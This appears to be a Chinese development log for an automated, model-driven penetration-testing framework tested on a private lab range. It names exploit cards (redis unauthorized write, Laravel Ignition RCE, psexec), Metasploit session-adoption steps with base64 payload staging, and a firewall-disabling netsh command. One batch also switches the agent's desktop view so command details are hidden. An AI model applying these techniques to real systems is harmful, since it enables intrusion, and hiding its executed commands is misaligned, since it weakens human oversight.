  每层字段表＋真实例＋真件路径，另附文件对照表与旧字段离场记录。

**守线核对**：新目录不在 pytest／CI 扫描面内；逐条对过 `tests/test_project_layout.py`——
非空、无 BOM、LF、无点目录。`IO协议/.idea/` 与 PyCharm 样例 `main.py` 未入库；同时把 `.idea/` 加进 `.gitignore`——IDE 元数据（根目录与子目录各一份）从此不再污染 `git status`／CI 记录，也不可能被误提交（`main.py` 是 PyCharm 自动生成的示例脚本，未入库，是否清理由项目方决定）。
本地 pytest **1178 passed／1 skipped**（与 r127 基线一致）。

**关键文件 SHA256**：

```text
P1P2i.json（354 B）
3032eecba6812951ab533e1334a1b60151a5d27efec2236dd261aabed4d96ad4

P1P2o.json（76 B）
e04990e61ed09e24079eb4395bd297ca900aaed2d4aa55cb1ad8d472f96d9ad0

E1i.json（107 B）
196bd6511d00521e5a7027f5367dc0ef8caeb78f2a57162273542bf5b9e958a5

E1o.json（2,006 B）
cce840c8f3ce06305a55aa185b930f99271cfdea9dc197a1956d68fa1f6c05fc

E2i.json（3,461 B）
1426953adb50b08197e0902c2c100977c0f7f700345296f3b50f09bc56b57b9c

E2o1.json（178 B）
f16e4ef2f5f8f427c49ca64cb4f457b82f5b0e8a78a980afe9dc9fa83defdbc7

E2o1.display.json（896 B）
3fda9be95ffa3b45d120bd5072645fb46f9b51ba9bedbb43d11fa797a719981e

E2o2.json（647 B）
3987a73a0f8cca68689f71f6ed875ae9cebf3563d9f6643a94c3a68cc547fa85

E3i.json（2,252 B）＝ E4i.json（E4 输入复用 E3 投影，两份同源同形）
0a8fb58ec3ace8c33769e71dc7db426819db63219ffaedb85962038cd7b33805

E3o.json（132 B）
49330da6c0bfe6664a9ee38f9fdef9ec40ee295f9e6865a02a298627efb357b5

E4o.json（298 B）
0af21988e2e36c8abdb16842acd87fcfbcd2813116f28a8e340f180293e4546f

P-E2-IO链路.md（18,192 B）
3914ffd08d40d78ffd501131b0e1a194f71b43c85b80e0c8ec471dbb75c3494e
```

**边界**：本轮只动 `IO协议/` 与本节登记，不碰代码与既有规格；E3／E4 模型形态的实机首跑、
E4 四字段整合仍为后续批次（说明文件「附 2」已登记）。


## 批次6 · 第 120 轮（2026-09-23）：验证粒度＝事实语义——属主参数退场＋http→tcp 归一＋端点 scheme 键分离；全图 19/17/2 收口＋历史观测复评成立；E1/E2 投影换 r130-io-node12 新批

**背景（项目方口径）**：服务类事实的验证粒度＝**事实语义**——`networkServiceInfo(web1,redis,tcp,6379,root)` 只验「服务身份＋端口状态（＋按需版本）」；`root` 是图的声明元数据，不是判据；`hacl` 只验连通性。属主参数（`expected_privilege`、属主三件套）自本批起退场。

**代码面**
- 映射层（`src/skills/leaf_mapping.py＋inputs_of`）：网络服务分支删属主参数产出；`protocol` 把已知 web 拼写 `http` 归一为传输名 `tcp`（其它值原样、无值不产键）。桥 r117 裁定：归一化只在映射层做。
- 判定器（`src/runtime/checker.py`）：服务身份匹配重写——开放状态必需（明确闭合→不通过；其余非开放→不确定）；身份依据＝结构化产品或主动识别标签，横幅／版本不参与身份；远程管理端点形状删属主尾段（无属主可成立）。三态完整保留。
- 装配层（`src/runtime/assembly.py`）：服务解析不再复制属主三件套；证据字段声明同步（`pre.service_version`）。
- 卡（`skills/pre.service_version`、`skills/pre.impacket_scm_query` 的声明＋正文＋入口）：同步删属主声明；服务卡 required 增 `protocol`（`const: tcp`）。
- **端点 scheme 键分离（r130；桥 r118 复核——认可为最小解、残余清单：无）**：`apply_assets` 端点分支不再把 `facts["protocol"]` 覆写为端点表的 `graph_protocol`（http）——容器节点的 URL 协议名另存 `target_scheme`，`target_url()` 优先读它、回退 `protocol`。同一个键的两种语义（校验侧 transport／URL scheme）解耦；URL 拼装与 host-map 覆盖行为不变。

**全图离线重评（19 行穷举）**：19 行＝**17 绑定＋2 缺口**——三个 HTTP 服务事实（`/nodes/2/dependencies/2`、`/nodes/5/dependencies/1`、`/nodes/8/dependencies/1`）全部恢复绑定（检查输入 `protocol="tcp"`；容器行地址侧解析为 `192.168.52.10:81` 发布端点）；两个原缺口保持（`/nodes/0/dependencies/4` 供应待输入、`/nodes/6/dependencies/0` 待值）。UDP／未知协议继续保留为缺口——不能借 TCP 卡成立（端点表在场时同样不成立）。

**历史观测离线复评（桥 r116 Q4 口径）**：r127 真件 `r127-e2-node12c/call-e2001-8598efed5ddc`（服务验证线）在新规则下重判——原结论 `uncertain`（属主证据缺口）→ 复评 **成立**（"the service on this port matches the leaf expectation (redis)"，三闸全过）。原观测、判定与结算保持不变、不复写。

**测试**：pytest **1183 passed／1 skipped**；CI **4/4**（手动报告 `output/reports/ci/c630cfd-dirty.json`，dirty 源＝本批未提交变更；提交后 pre-commit 钩子在同一批上再跑并生成新报告）。新增／更新断言：①选择器端点用例——tcp／udp／quic 三值均带端点表：transport 不被覆写、URL 照常生成、udp／quic 不锁定服务卡；②材料 `inputs` 不含 `target_scheme`；③真容器上下文（E1→E2 交接）——检索行、要求重建、模型视图三面一致（transport／发布地址／端口），模型参数面不含内部键。旧断言同步：属主断言删除；三态反例（缺状态／仅横幅／异产品含期待词）；装配遗留键不复制。

**IO 协议同步**：`E1i`／`E1o`／`E2i` 换 `output/runs/r130-io-node12/` 新批——inputs＝`target_host/port/expected_service/check_shape/protocol(tcp)`；`E2i`＝程序投影、与 prompt 输入段同形。`E2o1`／`E2o1.display`／`E2o2` 仍为 r127 实机批（该批 params 含当时字段；实机重跑需要靶场在线，下一次实机批整批换新）——`P-E2-IO链路.md` 附 2 第 3 条与文件对照表已注明。

**边界**：本轮为离线批——靶场虚拟机当前离线（192.168.52.128／192.168.52.10 均不可达），E2 实机链未重跑；r127 观测复评属「历史观测在新语义下成立」，不证明当前环境仍然成立。

**关键文件 SHA256（IO 三件新批）**：

```text
E1i.json（106 B）
5ee59092271b1990e3d9413bad56c81da68d7ea78f7c3bbce6678d03a5a888b6

E1o.json（1,994 B）
4ee7e95814db0ecfcd64844fa5b79dec517a324780756d92ca2a8937c8fa0b8b

E2i.json（3,450 B）
d97114c3736f24c9ef3ecfdd3add651c6337121beb66a3c83b96777f6d015f96

P-E2-IO链路.md（19,446 B）
71c9aa745b7346716ad3ac6c2a738e1bc23dcf5cb7c993fa63279f0a9ca93eba
```

**桥**：r117（协议归一裁定）与 r118（端点 scheme 分离复核）回件归档于 `work/bridge/20260923_run117_protocol_face.md`、`work/bridge/20260923_run118_endpoint_scheme.md`。
## 批次6 · 第 121 轮（2026-09-23）：静默执行加固——本地 spawn 全量补 `CREATE_NO_WINDOW`＋执行静默工具；桌面端展示切 `STEPS_PROSE`（会话不再展示命令行明细）

**背景（项目方口径）**：执行环境不得在桌面上产生任何窗口／命令行干扰（「说了不要谈命令行，是什么powershell有问题？有问题你就修好了再继续」）。

**代码面**：本地进程启动全量改为显式静默——`src/runtime/runner.py`、`scripts/ci.py`（×2）、`scripts/build_evidence_index.py`、`scripts/install_git_hooks.py`、`scripts/configure_hongri7_vmx.py`、`scripts/vmrun_guest.py`、`scripts/e2_unknown_endpoint.py`、`scripts/run_e2_pre.py`（×2）共 8 文件 10 处补 `creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)`（与既有 `review_hongri7.py`／`src/graph/visualize.py` 同款写法，POSIX 侧自动退化为 0）。`src/runtime/e2_dispatch.py` 的 `DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP`（worker 分离）保持不变——本就不产生窗口。

**工具**：新增静默执行器（工作区 `work\tools\quiet-exec.ps1`，`QRun`＝.NET `CreateNoWindow`＋UTF-8 双向捕获＋可选超时）；本会话起所有原生调用一律走它。

**展示面**：桌面端 `[desktop] conversationDetailMode` 由 `STEPS_COMMANDS` 改为 `STEPS_PROSE`（合法枚举自 `app.asar` 实测：`STEPS_PROSE`／`STEPS_COMMANDS`／`STEPS_EXECUTION`；改前备份 `config.toml.bak_r131_steps_prose`；启动器未见覆盖写入；生效或需重启桌面端）。

**证据与边界**：探针四组（对照最小化窗口／静默子进程／静默嵌套树／Start-Process 三态）可见控制台窗口计数均为 0；诚实边界：`conhost` 的 `MainWindowHandle` 探针对控制台窗口不敏感（最小化对照亦报 0），「肉眼可见」无法本机自证——本轮验收口径＝**构造性静默**（`CreateNoWindow`／隐藏），探针仅作辅助。

**测试**：pytest **1183 passed／1 skipped**（28.12s）；CI **4/4**（手动报告 `f2e3734-dirty.json`）。

**未决**：E2 实机三件（E2o1／display／E2o2）待靶场在线整批换新；E3／E4 模型形态实机首跑；`IO协议/main.py` 去留。

## 批次6 · 第 122 轮（2026-09-23）：桥 r119 全类型推广落地——四组运行修正（连通性来源／路径对齐／管理端点／属主比较）＋最低回归

**背景**：项目方口径＝验证粒度即事实语义（`networkServiceInfo` 只验服务身份＋端口状态＋按需版本，`hacl` 只验连通性）。本轮把该口径送桥复核并推广到全部叶类型；桥 r119 裁定「r116–r118 运行改动可直接用；全图覆盖需转译；全类型推广需补验四组」（回件 `work/bridge/20260923_run119_leaf_granularity.md`，只读核对、未执行命令或测试）。

**代码面（四组运行修正）**：
- 连通性：`src/skills/leaf_mapping.py＋inputs_of` 保留叶自身来源与传输名（http→tcp 归一在同一映射层）；`src/runtime/e2.py＋_slot` 删除父行为来源回填（只留目标／服务／端口）；`pre.nmap_tcp_probe` required 增 `protocol`（`const: tcp`）。
- 路径访问：`src/runtime/assembly.py＋_parse_posix_path_access` 删除请求回填的 `path`（路径只来自探针输出）；`src/runtime/checker.py＋_rule_posix_directory_access_matches` 先对齐路径与主体（既有明确对应仅 root↔uid 0），再判访问结果；目录卡 `write` 改必需（`const: true`）并删无人读取的 `directory` 声明。
- 管理端点：`_rule_scm_endpoint_matches` 删除 `requested_access`／`close_status` 两段否决——接口确已连接／打开即成立。
- 本机进程属主：`_principal_matches` 普通主体改规范化精确比较（system／root 等稳定别名保留）；`pre.cim_process_info` 删不参与判定的 `protocol`／`port_raw`。

**回归**：旧断言镜像 6 处＋连带 4 处（explain×3、selector×1）；新增用例——叶来源与父来源不同（`tests/test_runtime_e2.py::LeafSourceTests`）、tcp／http 可绑与 udp／未知留缺口、非写入路径不锁目录卡（`tests/test_runtime_retrieval.py`）；既有规则用例扩 12 例（缺路径／异路径／主体不符不确定、SCM 清理失败不改判、普通属主精确比较等）。

**测试**：pytest **1186 passed／1 skipped**；CI **4/4**（手动报告 `12fd4aa-dirty.json`，dirty 源＝本批未提交变更；提交后 pre-commit 在同一批上再跑并生成新报告）。

**诚实边界**：本轮为离线批——靶场虚拟机当前离线；`_json_probe_row` 服务解析边界反例（仅含版本字样的响应不得升格为身份）与防火墙三档范围转译仍挂账（桥 r119 自我证伪清单）。连通性来源问题此前未在现图触发，本轮以异源夹具回归补上。

**未决**：E2 实机三件（E2o1／display／E2o2）待靶场在线整批换新；E3／E4 模型形态实机首跑；`IO协议/main.py` 去留。

## 批次6 · 第 123 轮（2026-09-23）：桥 r120 落地——防火墙「活动档」口径＋服务解析边界反例（INFO 帧白名单）；靶场重启与端点装机（实机批次由预算问题接续到第 124 轮）

**背景（项目方口径）**：防火墙判定松口为「活动档」——以靶场与 writeup 真实情况为准（域控计划任务 `unablefirewall` 执行 `netsh advfirewall set allprofiles state off`，三档全关；判定只看**当前活动档**，不再要求三档全等比）；服务解析「补关键词」收窄——裸 `xxx_version:` 字样不得升格为服务身份，只认成形协议帧（redis INFO `# Server` 段白名单）。桥单 r120 裁定（回件 `work/bridge/20260923_run120_firewall_service_edge.md`）：A＝活动档口径＋新增 `active_profiles`、未知不回退三档；B＝只认成形 INFO 帧。

**代码面**：
- 防火墙：`src/runtime/assembly.py::_parse_firewall_state` 重写（新对象 `{policy_store, profile_scope, query_complete, active_profiles, profiles}`；旧三档列表照收但 `active_profiles=null`）；`EVIDENCE_FIELDS["pre.netsecurity_firewall_state"]` 增 `active_profiles`；`src/runtime/checker.py::_rule_firewall_profiles_match` 改活动档口径（无/空/未知活动档→missing；仅活动档比对；`query_complete=false`→missing；闲置档不参与）；`skills/pre.netsecurity_firewall_state/` 卡更新（skill.json 证据字段＋SKILL.md 模板/判定改写：一次性读三档＋活动档）。
- 服务解析：删裸文本正则 `_VERSION_LINE`；新增 `_info_identity()`（丢弃首个 `$N` bulk 行、首行须 `# Server`、仅 Server 段内完整 `key:value` 行、段/字段数各恰 1；白名单 `redis_version`）；`_json_probe_row` 走新解析。

**回归**：`tests/test_assembly.py` 活动档用例 8 例（替换原 3 例）＋ `InfoIdentityFrameTests` 7 例＋ socket 帧用例；`tests/test_checker.py` 规则直测改新语义。pytest **1199 passed／1 skipped**。

**实机**：靶场重启（Kali＋web1），三端口连通自检 OPEN；新端点装机（bundle `d6ed13c9…`、instance `e13a979e…`，kali 侧 `/home/kali/agv-e2-moved2-r125`）。

**诚实边界**：INFO 帧白名单的实机证据当时仍是离线用例级（r133 实机批模型选了 nmap 工具路，未走 INFO 帧路；**第 125 轮已补实机复演**——真字节 → 解析 → 三闸全过，见第 125 轮节）；防火墙活动档的实机（域控）证据留待该节点实机批。

**未决**：E2 实机三件换新（第 124 轮完成）；E3／E4 模型形态实机首跑；`IO协议/main.py` 已于第 125 轮删除。

## 批次6 · 第 124 轮（2026-09-23）：模型预算定批 12000＋截断/空答留痕；E2 实机首次跑通 `pre_satisfied`（node12 服务线）；IO 协议 E2 三件换新

**背景**：E2 实机在 4000 预算下同一 prompt 两次空内容（`completion_tokens=4000` 顶格）；live probe（同 prompt）8000 才出 `stop`。桥 r121 裁定（回件 `work/bridge/20260923_run121_model_budget.md`）：统一提常量、`retries=0` 不动、记录面补 `finish_reason`、E3/E4 各自跑代表样本验收。

**代码面**：
- `MAX_COMPLETION_TOKENS` 4000→8000→**12000**（同日 8000 首次实跑仍 `finish_reason=length`；同 prompt 三次调用推理 5838/6293/>8000 tokens，长度波动属实）＋注释现场留痕；
- 新增 `TRUNCATED_ERROR`：`finish_reason=length` 即便带内容也按截断失败、不解析不派发；空答错误串带 `finish_reason`；transport 重试判定改 `startswith`（截断不重试、空答仍可重试）；
- `ModelReply` 增 `finish_reason`／`max_tokens`；三处模型记录（choice／generation／planner）与 `model.jsonl` 行同步落 `finish_reason`。

**回归**：新增用例 3 例（length 截断不重试且不派发、空答带 stop 原因且零重试单次调用、记录行带停止原因）＋预算断言随常量；pytest **1202 passed／1 skipped**；CI **4/4**。

**实机（靶场在线）**：
- 源材料重基：`r133-src-node12b`（r127 输入→当前代码重投影＋E1 重检索；node12 材料自足无缺值；READY 校验 node14 完成后 node12 可采纳）。
- E2 批留痕三代：`r133-e2-node12a`（4000：两次空内容）→ `r133-e2-node12b`（8000：截断一次）→ `r133-e2-node12c`（12000：**跑通**）。
- `r133-e2-node12c` 结论：`pre_satisfied`；call `call-e2001-dbc0ce0b8596`；模型一次 `generate_pre_checks`（12.3s、2729 completion tokens、`finish_reason=stop`）→ 一条 `nmap` tool_call → 三闸全过（freshness／target／effect，`rule=service_matches_expected`）。

**IO 协议换新**：`E2o1`／`E2o1.display`／`E2o2` 换 r133-e2-node12c 新批（模型答复含 `--version-light`；params 无属主字段；call_id／命令／digest 全对真件）；`P-E2-IO链路.md` 版本行、b-2／b-3、c-1 封存与三闸真件、c-2 例子、c-3 字段行、附 1 对照表、附 2 第 3 条同步更新。

**诚实边界**：E3／E4 预算未验（各自代表样本验收挂账）；推理长度波动属实——12000 亦非「保证值」；kali 侧 bundle 未重建（复用 `agv-e2-moved2-r125` 目录内 `d6ed13c9…` bundle）。

**未决**：E3／E4 模型形态实机首跑（下一轮＝E3）；`IO协议/main.py` 已于第 125 轮删除。

## 批次6 · 第 125 轮（2026-09-23）：E2 尾巴收净——INFO 帧解析面实机证据（真字节 → 解析 → 判定）；`IO协议` 目录清理；work 仓记账

**背景**：第 123 轮的诚实边界挂着一条——INFO 帧白名单的实机证据仍是离线用例级（r133 实机批模型选了 nmap 工具路）。本轮在靶场在线时按卡片自带的代码路径实跑补上，并清掉 `IO协议/` 里 IDE 误生成的样例脚本，E2 章节到此结清。

**做法（解析面实机复演；非封存调用、无模型）**：
1. Kali（`kali@192.168.52.128`，Python 3.11.6）实跑卡片 `pre.service_version` 的代码路径：`probe.py`（卡片示例原样，RESP `INFO server` 交互）＋ `params.json`（`target_host=192.168.52.10`、`port=6379`）；远程命令用 marker `agv5b7e1d92` 包裹，rc=0；
2. 原始输出落 `output/runs/r135-e2-info-node12/stdout.txt`（573 B，sha256 `457311a3…`；`probe.py` sha256 `7bdade83…`；采集脚本 `work/tools/info_probe_r135.py`）；
3. 本机用仓库自己的读与判复演：`src/runtime/assembly.py::_json_probe_row` → `src/runtime/checker.py::check`（真卡 `pre.service_version`、节点真 inputs／requirement；证据件 `evidence.json`／`judgement.json`／`manifest.json`）。

**结果**：
- 真字节回包：RESP 大块 `$407`，首行 `# Server`，`redis_version:2.8.17`（与 r133 实机批的 nmap 观测 `Redis key-value store`／`2.8.17` 相互印证）；
- 解析：`service_product=redis`、`service_version=2.8.17`、`state=open`、`port=6379`（bulk 头丢弃、单 Server 段、单版本字段）；
- 判定：三闸全过（freshness：marker 命中本调用原始输出；target：`192.168.52.10` 与节点目标对齐；effect：`service_matches_expected`）→ `verdict=pass`。

**清理与记账**：`IO协议/main.py`（PyCharm 模板样例，2026-09-22 误生成）删除；`IO协议/.idea/` 属 gitignore 面、不动；work 仓第 123／124／125 轮合并落账。

**诚实边界**：本证据是「解析＋判定面实机复演」（call_id `call-e2info-5b7e1d92` 为本轮证据专用，非封存调用）；批内模型走哪条探测路（nmap 工具路／probe 代码路）由模型自决——两路在仓库的读与判上共用同一证据面，不构成遗留项。

## 批次6 · 第 126 轮（2026-09-23 晚）：卡名前缀统一＋E3/E4 合并落码（r136/r137）；实机批——三张卡面复演全过、impacket 环境混搭自愈、node 级停点如实留档

**背景**：桥 r124 两份裁定（卡名前缀统一＋E3/E4 合并）落入代码（r136/r137），本批在 6 台靶场全开状态下跑实机：三张已补 `prepare/parse` 面的动作卡（impacket psexec／impacket wmiexec／netexec 防火墙）做卡面复演；永久性动作验后恢复原状。宗旨：通用性——技能参数化，不硬编码靶场 IP／路径／凭据。

**代码面（r136 4e9d54e／r137 93731f0）**：
- 前缀统一：11 张动作卡并入 `exploit.` 域（33 文件迁移）；`DOMAINS` 收敛四域 `pre/post/exploit/session`；registry schema 三处 pattern 与守线逐字同形；`skills/index.json` 重建（32 skills＝13 action／19 support）。
- E3/E4 合并：`e3.run_action`＝派发 → 按卡判据试算（`publish=False`）→（卡声明 `supplemental_observation` 时）同卡补观察一次 → 证据合并（主动作值优先、补观察只填缺键，落 `merged_envelope.json`）→ 同一判据重算 → 唯一结论（pass／fail／incomplete）；判定落主动作调用；`runtime/e4.py`、`runtime/e4_post.py` 与 E4 后置运行入口（`run_e4_post`）下线。

**实机批（r138–r140）**：
1. **node14／12／28 全链 pass（E2→E3）**：
   - node14：E2 `call-e2001-112126620c1a`（leaf15 `pre.nmap_tcp_probe`，`directed_tcp_connect_matches`）→ E3 `call-e3001-405c0c9bfd20` pass；
   - node12：E2 `call-e2001-ddf7e5861f4e`（leaf17 `pre.service_version`，`service_matches_expected`）→ E3 `call-e3001-023260b6524d`（`exploit.redis_unauth_write`，写入回读一致＋自清，`readback_value==value`）pass；
   - node28：E2 `call-e2001-0184ee18e573`（leaf32）→ E3 `call-e3001-da982b3887b8`（`exploit.laravel_ignition_rce`，`wrapped_output_present`）pass。此链抓出「前端代理＋框架」服务识别缺口并修复：`assembly._application_claim`＋`EVIDENCE_FIELDS`、`checker` 三候选身份对齐、`pre.service_version` 卡面收紧、用例 +5。
2. **三张卡补 `prepare_call/parse_call` 面**：psexec／wmiexec（`marker_script(build_argv…)` 外层包裹＋`parse_probe`）；netexec（`build_script` apply＋readback 两段＋`split_sections` 读回段）。round-trip 用例 ×3。
3. **卡面实机复演（r140 三连 pass，目标 dc）**：
   - `output/runs/face-live-r140-psexec-dc`／`call-face-92c15e0dcab9`：三闸全过（freshness／target／identity，`nt authority\system`）；
   - `output/runs/face-live-r140-wmiexec-dc`／`call-face-f54891d97a2c`：三闸全过；
   - `output/runs/face-live-r140-netexec-dc`／`call-face-e5c7cdba56b2`：三闸全过（effect `firewall_state==disabled`）。
4. **impacket 环境混搭退化的发现与自愈**：psexec 复演先两次 120 s 挂死（stdout 空，`RemoteStdInPipe` 连接失败后落入交互壳）。A/B 对照实测定性——纯 apt 0.11.0（`PYTHONNOUSERSITE=1`）1.9 s 全通；混搭（apt 0.11 脚本＋pip 用户级 0.13.1 库，netexec 1.5.1 的依赖环境，2026-09-15 落位）必挂。修复＝共享常量 `IMPACKET_CLI_PREFIX = ("env", "PYTHONNOUSERSITE=1")`，psexec／wmiexec 两卡 argv 前缀钉定（wrapper 回到自己的发行版环境）；netexec 卡不动（nxc 与其 pip 库自洽）。同时补 harness 执行语义：paramiko `stdin.close()` 只关本地缓冲，改 `channel.shutdown_write()` 发 EOF，与端点 worker 的 DEVNULL 对齐。
5. **node 级停点（如实留档）**：
   - `output/runs/verify-e2-node44`／`verify-e2-node2`：E2 stopped——leaf39 `pre.nmap_tcp_probe` uncertain，vantage 守线「the probe ran from kali@192.168.52.128 while the leaf asks for pc1」（正确拦截，防跨 vantage 假证据）；
   - `output/runs/verify-e2-node48`：E2 stopped——leaf50 `pre.netsecurity_firewall_state` uncertain，模型生成的 Windows PowerShell 脚本在 kali 上 rc=127（无 powershell），「active profiles were not observed」（model 卡缺目标平台执行点语义）。
   - 两缺口均为设计面问题，不在本批硬修。
6. **端点换代**：r139 bundle `e8b160f1…`（当前 src）、instance `e13a979ecc6444018f8f87185463024a`、store `/home/kali/agv-e2-moved2-r125/registry`；run 前以 `output/e2-endpoint-r139.json` 重装（r138 记录名与事实不符，弃用）。

**恢复原状（永久性动作闭环）**：
- pc2（.93.40）：上批遗留「三档全关」→ `netsh advfirewall set allprofiles state on` 恢复（回执「确定。」，rc=0；随后 445／139／3389／5985 filtered、135 open，与「原状＝防火墙开」互证）；
- dc（.93.30）：netexec 卡面复演真关一次（readback 0x0×3）→ 恢复（回执「确定。」＋readback 0x1×3＋端口表 445／135／139／3389／5985 全 open）；
- redis 键 `agv:verify:r126`＝nil、`KEYS agv*` 空；kali 无 msf／nc／socat 监听；`/tmp/agv-payloads/` 仅 09-20 旧物（非本批）；web1 80／81／6379 与预期一致。

**诚实边界**：node 级 12 动作节点中 6 个（node5／7／19／22／26／30）属图-技能缺口面，未在本批展开；node44／2／48 停在设计缺口而非技能失效；harness 与端点 worker 的执行语义差异（arg 经远端登录 shell 二次解析 vs worker 直接 exec argv；stdin 的 EOF 语义）已有对照实验并按 worker 语义对齐；web2／pc1 的 filtered 端口为本批未触碰的既有状态。

**未决**：pc1 执行通道（vantage）与 model 卡目标平台语义两个设计缺口；12 节点中 6 个缺口面的卡面（技能库侧）。


## 批次6 · 第 127 轮（2026-09-23 深夜）：会话/连接台账①②③落码（r141＝9116b05）——一机多行＋单一写入口＋轻探针写回；桥 r139 复核单起飞

**背景**：桥 r127/r128 裁定确立连接管理口径（同机多行／单一登记入口／轻探针含失败／权限列为观测值／触发口径）后，本批先行落码结构件。④收编/替代、⑤路径转发、执行位置接入留下一批。

**代码面（10 文件 +369/−33，r141＝9116b05）**：
- `src/runtime/run.py`：台账＝`sessions[主机名]=[行…]`（行＝描述符＋`probe_ref`；legacy 单条描述符读作一行）；新函数 `session_rows / pick_session / _connection_key / register_session / mark_probe / load_sessions`；写侧收敛（`absorb_evidence`、`_absorb_supply`、run_path/run_agent 输入装载）；`run_result.sessions` 每行带 `graph_host`。
- 匹配键：有句柄 id 用 (driver,id)；无 id 按地址；皆无可比各自一行；命中就地更新、未命中追加、重复投递幂等。
- 读侧 13 处收敛；文档：`skill_contract` §14 sessions 语义行、`file_tree.md` 新测试登记。
- 用例 +16；pytest 1211/1；CI 4/4。

**诚实边界**：结构迁移批（无实机联调）；r139 复核单 `q_orch_r139_ledger_review`（run 20260923_234117_39ad）已起飞。

## 批次6 · 第 128 轮（2026-09-24 凌晨）：桥 r139 裁定落码——共同前置（候选键边界／unknown 写序／失败未知不得直接派发）

**背景**：桥 r139 复核第 127 轮实现：结构基本符合裁定、执行消费语义尚未收口——A 匹配键只能算「候选键」且地址回退要用驱动入口字段组合；B 首行只能作最终择一、失败/未知不得直接作执行准入、读侧保留职责差异；C `probe_ref` 增 `unknown`＋「派发前先落 unknown、结果只结算本次调用」写序；D `graph_host` 保留。下一批顺序裁定：共同前置 → ③执行位置接入 → ①收编/②路径并行 → 深层联合验收。

**代码面**：
- `src/runtime/run.py`：`_connection_key` 改「句柄＋驱动入口字段组合」（webshell=`base_url`+`include_path` 组合、agent/ssh/session 各按自己的入口字段；同 id 换入口＝各自一行）；`register_session(probe=…)`——只有产物自带探针证据（`verified.call`）才写 pass，且仅当该行引用为空或正指向本次调用（旧供给重放不回退最新事实）；新增 `begin_probe`（派发前写 unknown、新尝试总是接管）与 `settle_probe`（只结算引用所指向的本次尝试，迟到结果不覆盖）；`usable_rows`/`pick_usable_session`（fail/unknown 不得直接派发、无引用仍是候选）；`_absorb_supply` 不再把「拿到描述符/打开通道」当探针通过。
- 读侧职责差异（r139）：台账/模型候选视图/结果投影读全部行（`state_view` 每行一条）；执行入口（chain 会话、选择器 `session_ref`、session_agent 取用、orchestrator 持有等级）统一走 `pick_usable_session`；对齐读取（`runtime_target_aliases`）遍历全部行。
- `scripts/run_path.py`：`verify_channel` 改 begin→dispatch→settle 写序（中断回来是 unknown，迟到结果不结算）。

**回归**：用例净 +6（入口组合分行×2／无探针证据不写 pass／重放不回退／begin-unknown-中断／迟到不结算／派发筛选；supply 写回两例改走 settle 链，语义不变）。

**测试**：pytest **1217 passed / 1 skipped**；CI **4/4**。

**诚实边界**：本批仍是离线结构件——连接消费的真实联调随执行位置接入批做；三态判定链与路径二小实验未启动；pc1 执行通道与 model 卡目标平台两个设计缺口保持挂账。

**未决**：执行位置接入（经该主机连接执行探针＝node44/2 停点根因）；①收编/替代流转；②路径二出站+返回分列验证。

## 批次7 · 第 180 轮（2026-09-27 深夜）：纳管三卡实机落地（native／web／mount）＋ 整图复验 ＋ 靶场服务修复

**背景**：目标 ⑥「让纳管卡可实机」＝目标侧常驻组件包 + 注册契约 + 三张 adopt 卡按仓库卡模板补齐。桥 r176 已裁定
「三张卡绑定一个公共入口、不复制脚本；mount 无真实启动动作时零写入先拒绝」。

**代码面**：
- 新增 `src/runtime/adopt.py`：**一份方法**六步 —— 量回连地址（`ip -4 route get`，量不出即拒绝）→ 生成端点包
  （控制台自带工具，非自研，sha256 随证据走）→ **先架接收器**（脱离通道后台运行）→ 按载体搬运并启动 →
  等控制台确认登记号 → 只读核验（取身份与设备）。**两个执行点**分开：控制台侧（生成／接收器／查登记表／核验）
  与载体落点侧（搬字节／启动）。
- 载体三种：`native`＝已有原生登录（命令落在落点）；`web`＝网页命令入口（一次请求一条命令，入口状态由调用方给全）；
  `mount`＝文件系统搬运字节 + **点名的**启动通道（`stage_path` / `launch_path` 两侧路径可分列；无启动通道则
  消费前先拒绝，`NO_TARGET_STARTER`）。
- 搬运纪律：base64 分片（首片覆盖、后续追加），末段才解码（posix 给执行位、windows 走系统自带解码）；启动脱离通道。
- **登记契约**：只有接收器日志认领的登记号才算本次调用所建；控制台列表里多出来的新登记号记
  `unattributed_new_sid`（旧端点包复活不得被签字）；启动命令退出码／文件落地／进程存在都不算证据。
- 三张卡：`session.msf_adopt_native` / `_web` / `_mount`（`status=program_only` + fixed + 随卡 `entry.py` 声明式绑定，
  检索永不提供，路由表按名调用）；`entry.py` 各约 1.3 KB，只声明接入类型。
- `runtime/connection_management.py`：`RELAY_BACKEND_AVAILABLE=True`（两个独立进程的中继已实机双通）；
  `ensure_resident` 接成真钩子（跑卡 → `adopt.registration` 换算候选 → `assess_endpoint` → `REGISTERED/PUBLISHED`，
  不过则 `REJECTED` 带原因）；`ensure_deep_endpoint` 按名拒绝仍缺的那一半执行点。
- `scripts/run_skill_remote.py`：`--chain` 时把**第二执行点**（控制台所在的第一跳）传给声明了它的卡。
- 守线同步：`PILOT_IDS` +3、`assembly_counts` 21→24、`by_provides` / `excluded` 快照、`docs/file_tree.md`。

**实机证据（三载体 × 三类设备）**：

| 载体 | 运行目录 / 主调用 | 结果 | 身份 · 设备 | 归属 |
|---|---|---|---|---|
| native | `output/runs/D-adopt-native-2` · `call-20260926T231611-1d4aeb` | 三闸全过（`judgement.json`）| `root` · 目标自报主机名 | 接收器日志认领 |
| web | `output/runs/D-adopt-web-1` · `call-20260926T231916-fc2760` | 三闸全过 | `www-data` · 容器地址 | 接收器日志认领 |
| mount | `output/runs/D-adopt-mount-1` · `call-20260926T232054-dedae9` | 三闸全过 | `SYSTEM` · 目标机名 | 接收器日志认领 |

- 首跑（`D-adopt-native-1`）留下未认领一例：接收器写盘比轮询慢一拍 → 记 `unattributed_new_sid`，
  随后按此加了「有界补读」并复跑到认领；两条都在档。
- `web` 载体的入口通道由 `session.webshell_via_laravel`（`D-adopt-web-shell1`）产出；
  `mount` 载体的文件侧是 kali 上对目标管理共享的 CIFS 挂载（`vers=2.1`，`/mnt/...`→`C:\...` 两路径分列），
  启动侧是既有的常驻控制台会话。
- `mount` 的启动调用本身**超时**（控制台会话执行系统命令的读回老毛病），卡片如实记 `timeout`，
  登记与核验不受影响 —— 恰好是「启动命令的状态不是证据」的现场样本。

**靶场服务修复（环境面，属既有问题清理）**：
- 现象：OA 入口不可达（`home=000`）、上传返回「用户未登录」。
- 根因与处置：① PC1 的 OA 服务组**被停**（`Office_Web` 之外的 `MySQL5_OA` 与 9 个 `Office_*` 全为 STOPPED）
  → 全部启动，`home=200` 且 `POST /logincheck_code.php UID=1` 复活（`status:1`）；
